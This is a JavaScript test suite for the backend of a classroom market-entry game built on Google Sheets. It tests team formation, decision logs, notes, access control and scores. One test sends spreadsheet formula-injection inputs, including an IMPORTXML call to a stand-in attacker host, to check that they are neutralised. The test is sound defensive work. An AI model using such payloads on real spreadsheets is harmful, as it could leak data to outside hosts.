import test from 'node:test';
import assert from 'node:assert/strict';
import { CONFIG, WORKSHEET } from '../src/scenario.mjs';
import { makeRoom, marketForTable, validateRecord, problemFor, TEAMS } from '../src/rules.mjs';
import { buildEvents } from '../src/sync.mjs';
import { createBackend } from '../scripts/fake-google.mjs';

const start = Date.parse("2026-11-14T18:30:00+03:00");
const room = makeRoom(start, 0, "ABC");
const markets = TEAMS.map(team => marketForTable(room, team));
const at = minutes => new Date(start + minutes * 60_000).toISOString();
const TOKEN = "correct horse battery";

const pid = index => "player-id-" + String(index).padStart(6, "0");
const call = (backend, body) => JSON.parse(backend.handle("POST", "/", JSON.stringify(body)).body);
const get = (backend, query) => JSON.parse(backend.handle("GET", "/?" + query).body);
const host = (backend, type, extra = {}) => call(backend, {v: 1, type, token: TOKEN, ...extra});
const join = (backend, index, international = false, name = "Player " + index) => call(backend, {v: 1, type: "join", id: pid(index), name, international});

// A game with `count` players, teams formed and (by default) started: returns the secret pass of one player per team.
function newGame({count = 8, started = true} = {}) {
  const backend = createBackend({token: TOKEN});
  for (let index = 1; index <= count; index++) assert.equal(join(backend, index, index % 3 === 0).ok, true);
  assert.equal(host(backend, "form").ok, true);
  if (started) assert.equal(host(backend, "start", {room, start: at(0), markets}).ok, true);
  const players = backend.table("Players");
  const pass = Object.fromEntries(TEAMS.map(team => [team, players.find(row => Number(row.team) === team).id]));
  return {backend, pass};
}

function record(team, choices, methods = {}) {
  const market = marketForTable(room, team);
  const history = choices.map((choice, index) => ({
    // A default or a deadline decision is recorded at the end of its round; a decision made by the team earlier.
    round: "R" + (index + 1), choice, method: methods[index] ?? "submitted",
    at: at((methods[index] ?? "submitted") === "submitted" ? [5, 20, 40, 55, 75, 95, 110][index] : [16, 32, 50, 60, 84, 104, 119][index]),
    evidence: "evidence " + (index + 1), tradeoff: "trade-off " + (index + 1),
    ...(index === 5 && choice === "targeted" ? {problem: problemFor(market, choices[0])} : {})
  }));
  return validateRecord({game: CONFIG.game, version: CONFIG.version, mode: "live", team, market, room, session: "s" + team, history, drafts: {}, notes: {}, brief: "", bulletinB: false});
}
const decisions = (participant, events, sentAt = Date.now()) => ({v: 1, participant, sentAt: new Date(sentAt).toISOString(), clockOffsetMs: 0, events});
const send = (backend, participant, events, sentAt) => call(backend, decisions(participant, events, sentAt));
const sendNotes = (backend, participant, team, items, brief) => call(backend, {v: 1, type: "notes", participant, room, team, market: marketForTable(room, team), session: "s" + team,
  sentAt: new Date().toISOString(), items, ...(brief ? {brief} : {})});
const note = (round, field, text, minutes = 10) => ({round, field, text, at: new Date(Date.now() + minutes * 1000).toISOString()});
// The cells of a sheet row by row, without the empty cells at the end (Google does not return them either).
const sheetRows = (backend, name) => Array.from(backend.spreadsheet.getSheetByName(name).rows, row => {
  const cells = [...(row ?? [])];
  while (cells.length && cells.at(-1) === "") cells.pop();
  return cells;
});
const roundRow = (backend, team, round) => sheetRows(backend, "Team " + team).find(row => row[0] === round);

test("The script knows exactly the worksheet fields of the game", () => {
  const backend = createBackend();
  const fields = JSON.parse(JSON.stringify(backend.script.ROUND_FIELDS));
  assert.deepEqual(fields, Object.fromEntries(Object.entries(WORKSHEET).map(([round, list]) => [round, list.map(([field]) => field)])));
  for (const list of Object.values(WORKSHEET)) for (const [field, label] of list) assert.equal(backend.script.FIELD_LABELS[field], label, field);
  assert.equal(backend.script.NOTES_TOTAL, Object.values(WORKSHEET).reduce((sum, list) => sum + list.length, 0));
});

// ---- Players and the randomizer ---------------------------------------------------------------------------

test("A player joins with a name and an international yes or no, and waits in the lobby", () => {
  const backend = createBackend({token: TOKEN});
  assert.deepEqual(get(backend, "action=me&id=" + pid(1)), {ok: true, state: "lobby", players: 0, found: false});
  const me = join(backend, 1, true, "  Anna   K  ");
  assert.equal(me.found, true);
  assert.equal(me.name, "Anna K");
  assert.equal(me.international, true);
  assert.equal(me.team, 0);
  assert.equal(me.state, "lobby");
  assert.equal(me.room, "", "no game yet");
  assert.equal(join(backend, 1, false, "Another name").name, "Anna K", "joining again with the same pass changes nothing");
  assert.equal(backend.table("Players").length, 1);
  assert.equal(join(backend, 2, false).players, 2);
  const [row] = backend.table("Players");
  assert.deepEqual([row.name, row.international, row.id], ["Anna K", "yes", pid(1)]);
});

test("Bad sign-ups are refused: taken or odd names, a missing answer, a bad pass", () => {
  const backend = createBackend({token: TOKEN});
  join(backend, 1, false, "Anna K");
  assert.match(join(backend, 2, false, "anna k").error, /already taken/);
  assert.match(join(backend, 3, false, "A").error, /Enter your name/);
  assert.match(join(backend, 3, false, "=HYPERLINK(1)").error, /Start your name with a letter/);
  assert.match(join(backend, 3, false, "x".repeat(41)).error, /Enter your name/);
  assert.match(call(backend, {v: 1, type: "join", id: pid(3), name: "Boris"}).error, /international/);
  assert.match(call(backend, {v: 1, type: "join", id: "short", name: "Boris", international: false}).error, /Reload the page/);
  assert.equal(backend.table("Players").length, 1);
});

test("The randomizer makes four teams of balanced size with the international students spread evenly", () => {
  const {script} = createBackend();
  for (let round = 0; round < 60; round++) {
    const count = 4 + Math.floor(Math.random() * 25);
    const international = Math.floor(Math.random() * (count + 1));
    const players = Array.from({length: count}, (_, index) => ({international: index < international}));
    const plan = script.assignTeams(players, Math.random);
    const sizes = [1, 2, 3, 4].map(team => plan.teams.filter(value => value === team).length);
    const kinds = [1, 2, 3, 4].map(team => plan.teams.filter((value, index) => value === team && players[index].international).length);
    assert.ok(Math.max(...sizes) - Math.min(...sizes) <= 1, "sizes " + sizes + " for " + count);
    assert.ok(Math.max(...kinds) - Math.min(...kinds) <= 1, "international " + kinds + " of " + international);
    assert.deepEqual([1, 2, 3, 4].map(team => plan.captains.filter((value, index) => value && plan.teams[index] === team).length), [1, 1, 1, 1]);
  }
});

test("The randomizer really shuffles: the same players land in different teams on another draw", () => {
  const {script} = createBackend();
  const players = Array.from({length: 12}, (_, index) => ({international: index < 4}));
  const draws = new Set(Array.from({length: 20}, () => script.assignTeams(players, Math.random).teams.join("")));
  assert.ok(draws.size > 5, "20 draws gave " + draws.size + " different arrangements");
});

test("Only the facilitator forms the teams, and it needs a player for every team", () => {
  const backend = createBackend({token: TOKEN});
  for (let index = 1; index <= 3; index++) join(backend, index);
  assert.match(call(backend, {v: 1, type: "form", token: "wrong"}).error, /Wrong facilitator password/);
  assert.match(call(backend, {v: 1, type: "form"}).error, /Wrong facilitator password/);
  assert.match(host(backend, "form").error, /At least 4 players/);
  join(backend, 4);
  const roster = host(backend, "form");
  assert.equal(roster.state, "formed");
  assert.deepEqual(roster.players.map(player => player.team).sort(), [1, 2, 3, 4]);
});

test("After the draw a player sees the team, the teammates and the captain; ready can be switched; a new draw clears it", () => {
  const {backend} = newGame({count: 10, started: false});
  const me = get(backend, "action=me&id=" + pid(1));
  assert.equal(me.state, "formed");
  assert.ok(me.team >= 1 && me.team <= 4);
  assert.ok(me.members.length >= 2);
  assert.equal(me.members.filter(member => member.captain).length, 1);
  assert.equal(me.room, "", "the market and the room are revealed at the start");
  assert.equal(call(backend, {v: 1, type: "ready", id: pid(1), ready: true}).ready, true);
  assert.equal(get(backend, "action=me&id=" + pid(1)).members.find(member => member.name === "Player 1").ready, true);
  assert.equal(call(backend, {v: 1, type: "ready", id: pid(1), ready: false}).ready, false);
  call(backend, {v: 1, type: "ready", id: pid(1), ready: true});
  host(backend, "form");
  assert.equal(get(backend, "action=me&id=" + pid(1)).ready, false, "a new draw clears the ready marks");
});

test("A player who joins after the draw is placed in the smallest team", () => {
  const {backend} = newGame({count: 9, started: false});
  const sizes = () => TEAMS.map(team => backend.table("Players").filter(row => Number(row.team) === team).length);
  assert.deepEqual(sizes().sort(), [2, 2, 2, 3]);
  join(backend, 10);
  assert.deepEqual(sizes().sort(), [2, 2, 3, 3]);
  assert.ok(Number(get(backend, "action=me&id=" + pid(10)).team) >= 1);
});

test("A teammate can take over as captain, and the old captain loses the role", () => {
  const {backend} = newGame({count: 8, started: false});
  const me = get(backend, "action=me&id=" + pid(1));
  const mate = me.members.find(member => member.name !== "Player 1");
  const mateIndex = Number(mate.name.split(" ")[1]);
  const taken = call(backend, {v: 1, type: "captain", id: pid(mateIndex)});
  assert.equal(taken.captain, true);
  assert.equal(taken.members.filter(member => member.captain).length, 1);
  assert.equal(get(backend, "action=me&id=" + pid(1)).captain, false);
});

test("Starting needs formed teams and a valid game number, and then shows the room to the players", () => {
  const backend = createBackend({token: TOKEN});
  for (let index = 1; index <= 8; index++) join(backend, index);
  assert.match(host(backend, "start", {room, start: at(0), markets}).error, /Form the teams first/);
  host(backend, "form");
  assert.match(call(backend, {v: 1, type: "start", token: "wrong", room, start: at(0), markets}).error, /Wrong facilitator password/);
  assert.match(host(backend, "start", {room: "NOPE", start: at(0), markets}).error, /Bad game number/);
  assert.match(host(backend, "start", {room, start: at(0), markets: ["a", "b"]}).error, /Bad market list/);
  assert.equal(host(backend, "start", {room, start: at(0), markets}).state, "started");
  const me = get(backend, "action=me&id=" + pid(1));
  assert.equal(me.state, "started");
  assert.equal(me.room, room);
  assert.equal(me.start, new Date(start).toISOString());
  assert.match(join(backend, 20).error, /already started/);
  assert.match(host(backend, "form").error, /already started/);
});

test("Demo players let the facilitator try the whole game alone", () => {
  const backend = createBackend({token: TOKEN});
  assert.match(call(backend, {v: 1, type: "demo"}).error, /Wrong facilitator password/);
  const roster = host(backend, "demo", {count: 8});
  assert.equal(roster.players.length, 8);
  assert.ok(roster.players.every(player => /^Demo \d+$/.test(player.name)));
  assert.equal(host(backend, "demo", {count: 4}).players.length, 12);
  assert.equal(host(backend, "form").state, "formed");
});

// ---- Decisions: the raw log and one sheet per team --------------------------------------------------------

test("Decisions are stored in the raw log with the problem and the game result, and re-sent events are duplicates", () => {
  const {backend, pass} = newGame();
  const events = buildEvents(record(1, ["A", "desk", "pilot", "verify", "narrow", "targeted", "pilot"]));
  const first = send(backend, pass[1], events);
  assert.equal(first.saved.length, 7);
  const rows = backend.table("Decisions");
  assert.equal(rows.length, 7);
  assert.equal(rows[5].problem, problemFor(marketForTable(room, 1), "A"), "the named problem is kept");
  assert.equal(rows[6].game, events[6].game);
  assert.ok(Number(rows[6].game) > 0);
  assert.equal(rows[0].received_at instanceof Date, true, "Google's clock stamps the row");
  const again = send(backend, pass[1], events);
  assert.equal(again.saved.length, 0);
  assert.equal(again.duplicates.length, 7);
  assert.equal(backend.table("Decisions").length, 7);
});

test("Each team has its own sheet: a table of the decisions it chose, round by round", () => {
  const {backend, pass} = newGame();
  send(backend, pass[1], buildEvents(record(1, ["A", "desk", "pilot"])));
  send(backend, pass[2], buildEvents(record(2, ["B", "desk"], {1: "default"})));

  const sheet = sheetRows(backend, "Team 1");
  assert.deepEqual(sheet[0].slice(0, 2), ["Team 1", "Indonesia"], "the title line names the team and its market");
  assert.equal(sheet[0][3].split(", ").length, backend.table("Players").filter(row => Number(row.team) === 1).length);
  assert.deepEqual(sheet[2].slice(0, 5), ["Round", "Stage", "Decision", "Choice", "How it was locked"], "a fixed header line");
  assert.deepEqual(sheet.slice(3, 10).map(row => row[0]), ["R1", "R2", "R3", "R4", "R5", "R6", "R7"]);

  const r1 = roundRow(backend, 1, "R1");
  assert.equal(r1[1], "Customer");
  assert.equal(r1[3], "A");
  assert.equal(r1[4], "locked by the team");
  assert.equal(r1[8], "evidence 1");
  assert.equal(r1[9], "trade-off 1");
  assert.equal(roundRow(backend, 1, "R3")[3], "pilot");
  assert.equal(roundRow(backend, 1, "R4")[4], "waiting", "a round the team has not reached");

  // The other team's choices are in the other team's sheet only.
  assert.equal(roundRow(backend, 2, "R2")[3], "desk");
  assert.match(roundRow(backend, 2, "R2")[4], /default/);
  assert.equal(roundRow(backend, 2, "R2")[5], 0, "cost");
  assert.equal(roundRow(backend, 3, "R1")[3], "", "a team with no decisions has an empty table");
  assert.equal(sheetRows(backend, "Team 3")[0][1], "Thailand");
});

test("The Overview sheet shows where each team is, its credits and what it chose, one row per team", () => {
  const {backend, pass} = newGame();
  send(backend, pass[1], buildEvents(record(1, ["A", "desk", "pilot"])));
  send(backend, pass[2], buildEvents(record(2, ["B", "desk"], {1: "default"})));
  let overview = backend.table("Overview");
  assert.deepEqual(overview.map(row => row.team), [1, 2, 3, 4]);
  const [one, two, three] = overview;
  assert.equal(one.stage, "R4 · Readiness (3 of 7 decided)");
  assert.deepEqual([one.R1, one.R2, one.R3, one.R4], ["A", "desk", "pilot", ""]);
  assert.equal(two.stage, "R3 · Entry route (2 of 7 decided)");
  assert.equal(two.R2, "desk *", "a default is marked with a star");
  assert.equal(two.credits_left, 9);
  assert.equal(three.stage, "Not started");
  assert.equal(one.market, "Indonesia");
  assert.ok(one.players.length > 3 && one.captain, "who plays, and who is the captain");

  send(backend, pass[1], buildEvents(record(1, ["A", "desk", "pilot", "reserve"])));
  overview = backend.table("Overview");
  assert.equal(overview.length, 4, "more events move the same row");
  assert.equal(overview.find(row => row.team === 1).stage, "R5 · Competition (4 of 7 decided)");
});

test("A finished team shows its game result in the Overview and in its own sheet", () => {
  const {backend, pass} = newGame();
  const full = record(1, ["A", "desk", "pilot", "verify", "narrow", "targeted", "pilot"]);
  send(backend, pass[1], buildEvents(full));
  const row = backend.table("Overview")[0];
  assert.equal(row.stage, "Finished");
  assert.equal(row.game_result, buildEvents(full)[6].game);
  assert.equal(sheetRows(backend, "Team 1")[0][9], buildEvents(full)[6].game);
});

test("Worksheet notes arrive per field, the newest wins, and they appear in the team's sheet", () => {
  const {backend, pass} = newGame();
  send(backend, pass[1], buildEvents(record(1, ["A", "desk"])));
  const saved = sendNotes(backend, pass[1], 1, [note("R1", "proposition", "Frequent travellers", 1), note("R1", "cage", "Two differences", 1), note("R2", "alternatives", "Mandiri vs BCA", 1)]);
  assert.equal(saved.saved, 3);
  const r1 = roundRow(backend, 1, "R1");
  assert.match(r1[10], /First customer, who uses Revolut[^\n]*\nFrequent travellers/);
  assert.match(r1[10], /Two important differences[^\n]*\nTwo differences/);
  assert.doesNotMatch(r1[10], /Cultural/, "an empty field is not listed");
  assert.match(roundRow(backend, 1, "R2")[10], /Mandiri vs BCA/);
  assert.match(backend.table("Overview")[0].notes_filled, /^3 of 17$/);

  const newer = sendNotes(backend, pass[1], 1, [note("R1", "proposition", "Frequent travellers, one corridor", 30)]);
  assert.equal(newer.saved, 1);
  const older = sendNotes(backend, pass[1], 1, [note("R1", "proposition", "old text", 5)]);
  assert.equal(older.saved, 0);
  assert.equal(older.ignored, 1);
  assert.match(roundRow(backend, 1, "R1")[10], /one corridor/);
  assert.equal(backend.table("Notes").length, 3, "one stored row per field");
});

test("Notes before the first decision still show in the team's sheet, and unknown fields are rejected", () => {
  const {backend, pass} = newGame();
  const result = sendNotes(backend, pass[3], 3, [note("R1", "proposition", "early idea"), note("R9", "x", "no"), note("R1", "nonsense", "no")]);
  assert.equal(result.saved, 1);
  assert.equal(result.rejected.length, 2);
  assert.equal(roundRow(backend, 3, "R1")[4], "waiting");
  assert.match(roundRow(backend, 3, "R1")[10], /early idea/);
  assert.equal(backend.table("Overview").find(row => row.team === 3).stage, "Not started");
});

test("The Board Brief sits at the bottom of the team's sheet", () => {
  const {backend, pass} = newGame();
  send(backend, pass[1], buildEvents(record(1, ["A"])));
  sendNotes(backend, pass[1], 1, [], {text: "Fund the pilot in Jakarta because…", at: new Date().toISOString()});
  const rows = sheetRows(backend, "Team 1");
  assert.deepEqual(rows.find(row => row[0] === "Board Brief").slice(0, 2), ["Board Brief", "Fund the pilot in Jakarta because…"]);
  assert.match(backend.table("Overview")[0].notes_filled, /· brief$/);
});

test("A rewritten round adds a flagged row; the team's sheet keeps the first decision and says so", () => {
  const {backend, pass} = newGame();
  send(backend, pass[1], buildEvents(record(1, ["A", "desk"])));
  send(backend, pass[1], buildEvents(record(1, ["A", "prototype"])));
  const log = backend.table("Decisions").filter(row => row.round === "R2");
  assert.equal(log.length, 2);
  assert.match(log[1].flags, /CONFLICT/);
  const r2 = roundRow(backend, 1, "R2");
  assert.equal(r2[3], "desk", "the first recorded decision stays authoritative");
  assert.match(r2[13], /CONFLICT: 1 more record/);
  assert.match(backend.table("Overview")[0].flags, /flagged/);
});

test("A device clock far from Google is flagged in the log", () => {
  const {backend, pass} = newGame();
  send(backend, pass[1], buildEvents(record(1, ["A"])), Date.now() - 10 * 60_000);
  assert.match(backend.table("Decisions")[0].flags, /CLOCK/);
});

test("Student text can never become a spreadsheet formula, and long text is cut", () => {
  const {backend, pass} = newGame();
  const [event] = buildEvents(record(1, ["A"]));
  send(backend, pass[1], [{...event, evidence: '=IMPORTXML("https://evil.example","//x")', tradeoff: "+SUM(1)", label: "@cmd"}]);
  const row = backend.table("Decisions")[0];
  for (const column of ["evidence", "tradeoff", "label"]) assert.ok(row[column].startsWith("'"), column);
  assert.ok(roundRow(backend, 1, "R1")[8].startsWith("'"), "also in the team's sheet");
  sendNotes(backend, pass[1], 1, [note("R1", "proposition", "=HYPERLINK(\"x\")"), note("R1", "cage", "x".repeat(5000))]);
  const stored = backend.table("Notes");
  assert.ok(stored.find(item => item.field === "proposition").text.startsWith("'"));
  assert.equal(stored.find(item => item.field === "cage").text.length, 1800);
});

// ---- Who may write and read -------------------------------------------------------------------------------

test("Only a player of the team can write its decisions and notes, and only while the game runs", () => {
  const {backend, pass} = newGame();
  const events = buildEvents(record(1, ["A", "desk"]));
  assert.match(send(backend, pass[2], events).rejected[0].reason, /not your team/, "another team's pass");
  assert.equal(backend.table("Decisions").length, 0);
  assert.match(send(backend, pid(99), events).error, /Unknown player/, "a pass the sheet never issued");
  assert.match(call(backend, {...decisions("", events)}).error, /Reload the page/, "no pass");
  assert.match(sendNotes(backend, pass[2], 1, [note("R1", "proposition", "x")]).error, /do not belong to your team/);
  assert.equal(backend.table("Notes").length, 0);
  assert.equal(send(backend, pass[1], events).saved.length, 2);

  const elsewhere = send(backend, pass[1], buildEvents(record(1, ["A"])).map(event => ({...event, room: makeRoom(start, 0, "ZZZ"), id: event.id.replace(room, makeRoom(start, 0, "ZZZ"))})));
  assert.match(elsewhere.rejected[0].reason, /not your team or game/, "another game number");

  const lobby = createBackend({token: TOKEN});
  for (let index = 1; index <= 4; index++) join(lobby, index);
  assert.match(send(lobby, pid(1), events).error, /has not started/);
});

test("Malformed requests are rejected without breaking the sheets", () => {
  const {backend, pass} = newGame();
  const [good, second] = buildEvents(record(1, ["A", "desk"]));
  const bad = [{...good, room: "NOPE"}, {...good, team: 9}, {...good, round: "R9"}, {...good, method: "cheat"}, {...good, seq: 3}, {...good, chain: "short"}, {...good, id: "other:1:0:abcdefghijk"}, null];
  const result = send(backend, pass[1], [...bad, second]);
  assert.equal(result.rejected.length, bad.length);
  assert.equal(result.saved.length, 1);
  assert.equal(JSON.parse(backend.handle("POST", "/", "not json").body).ok, false);
  assert.equal(call(backend, {...decisions(pass[1], [good]), v: 2}).ok, false);
  assert.equal(call(backend, {v: 1, type: "nonsense"}).ok, false);
  assert.equal(call(backend, {v: 1, type: "constructor"}).ok, false);
});

test("A player reads back only the own team's decisions and notes, to continue on another device", () => {
  const {backend, pass} = newGame();
  send(backend, pass[2], buildEvents(record(2, ["B", "interview", "alliance"])));
  sendNotes(backend, pass[2], 2, [note("R3", "early", "Month 0-3: sign the partner")], {text: "brief text", at: new Date().toISOString()});
  const data = get(backend, "action=team&id=" + pass[2]);
  assert.equal(data.ok, true);
  assert.equal(data.room, room);
  assert.equal(data.team, 2);
  assert.deepEqual(data.decisions.map(item => item.choice), ["B", "interview", "alliance"]);
  assert.equal(data.decisions[1].evidence, "evidence 2");
  assert.equal(data.decisions[0].at, at(5), "the original time of the decision comes back");
  assert.deepEqual(data.notes.map(item => `${item.round}.${item.field}=${item.text}`), ["R3.early=Month 0-3: sign the partner"]);
  assert.equal(data.brief.text, "brief text");
  assert.equal(get(backend, "action=team&id=" + pass[4]).decisions.length, 0, "a team never sees another team");
  assert.equal(get(backend, "action=team&id=" + pid(99)).ok, false);
  assert.equal(get(backend, "action=team").ok, false);
});

test("The facilitator reads the roster and the whole game with the password, and only then", () => {
  const {backend, pass} = newGame();
  send(backend, pass[1], buildEvents(record(1, ["A", "desk"])));
  send(backend, pass[3], buildEvents(record(3, ["B"])));
  assert.match(get(backend, "action=roster&token=wrong").error, /Wrong facilitator password/);
  assert.match(get(backend, "action=room").error, /Wrong facilitator password/);
  assert.match(get(backend, "action=room&token=" + pass[1]).error, /Wrong facilitator password/, "a player's pass is not the password");
  const roster = get(backend, "action=roster&token=" + encodeURIComponent(TOKEN));
  assert.equal(roster.state, "started");
  assert.equal(roster.room, room);
  assert.equal(roster.players.length, 8);
  assert.ok(roster.players.every(player => !("id" in player)), "the roster never carries the players' passes");
  const data = get(backend, "action=room&token=" + encodeURIComponent(TOKEN));
  assert.deepEqual(data.teams.map(team => team.decisions.length), [2, 0, 1, 0]);
  assert.equal(data.teams[0].market, markets[0]);
  assert.match(createBackend().handle("GET", "/?action=roster&token=x").body, /password is not set/);
});

// ---- Scores and a new game --------------------------------------------------------------------------------

test("The expert scores of the facilitator's page fill the Scores sheet, replacing the previous version", () => {
  const {backend} = newGame();
  const table = [["Rank", "Team", "Final (100)"], [1, 2, 71.5], [2, 1, "=SUM(A1)"]];
  assert.match(call(backend, {v: 1, type: "scores", table}).error, /Wrong facilitator password/);
  assert.equal(host(backend, "scores", {table}).ok, true);
  let rows = sheetRows(backend, "Scores");
  assert.deepEqual(rows[0], ["Rank", "Team", "Final (100)"]);
  assert.deepEqual(rows[1], [1, 2, 71.5], "numbers stay numbers");
  assert.equal(rows[2][2], "'=SUM(A1)", "text cannot become a formula");
  assert.equal(rows.find(row => row[0] === "Updated by the game")?.length, 2);
  host(backend, "scores", {table: [["Only", "this"]]});
  rows = sheetRows(backend, "Scores");
  assert.deepEqual(rows[0], ["Only", "this"]);
  assert.equal(rows.filter(row => row.some(value => value !== "")).length, 2, "the old rows are gone (the header and the update line remain)");
  assert.equal(host(backend, "scores", {table: []}).ok, false);
  assert.equal(host(backend, "scores", {table: Array.from({length: 41}, () => ["x"])}).ok, false);
});

test("A new game saves a copy and clears every sheet; players have to join again", () => {
  const {backend, pass} = newGame();
  send(backend, pass[1], buildEvents(record(1, ["A", "desk"])));
  host(backend, "scores", {table: [["a"]]});
  assert.match(call(backend, {v: 1, type: "reset"}).error, /Wrong facilitator password/);
  assert.equal(backend.table("Decisions").length, 2);
  const roster = host(backend, "reset");
  assert.equal(roster.state, "lobby");
  assert.equal(roster.players.length, 0);
  assert.equal(backend.spreadsheet.copies.length, 1);
  for (const name of ["Decisions", "Notes", "Players", "Overview"]) assert.equal(backend.table(name).length, 0, name);
  assert.equal(sheetRows(backend, "Team 1")[0][1], "Waiting for the game to start");
  assert.equal(get(backend, "action=me&id=" + pass[1]).found, false);
  assert.equal(get(backend, "action=roster&token=" + TOKEN).state, "lobby");
});

test("Every sheet exists, in the order the facilitator reads them", () => {
  const {backend} = newGame();
  assert.deepEqual(backend.spreadsheet.getSheets().map(sheet => sheet.getName()),
    ["Overview", "Team 1", "Team 2", "Team 3", "Team 4", "Scores", "Players", "Settings", "Decisions", "Notes"]);
});
